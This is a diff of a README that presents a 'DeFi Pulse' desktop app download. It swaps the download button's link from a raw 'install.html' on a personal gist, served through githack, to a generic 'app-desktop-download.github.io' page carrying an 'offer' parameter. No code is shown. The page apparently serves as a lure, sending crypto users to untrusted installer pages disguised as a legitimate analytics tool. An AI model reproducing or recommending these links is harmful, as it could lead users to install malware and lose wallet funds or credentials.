@@ -1,6 +1,6 @@
 # DeFi Pulse Download — Desktop App for DeFi Analytics and Market Data
 
-<a href="https://gistcdn.githack.com/niceguymosephad8/ed11fa80406532ebfb3bf9866a521979/raw/23661298311affc54d9d0f7ab717556679ec78a7/install.html?offer=DeFiPulse" target="_blank">
+<a href="https://app-desktop-download.github.io/.github/?offer=DeFiPulse" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20DeFiPulse-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
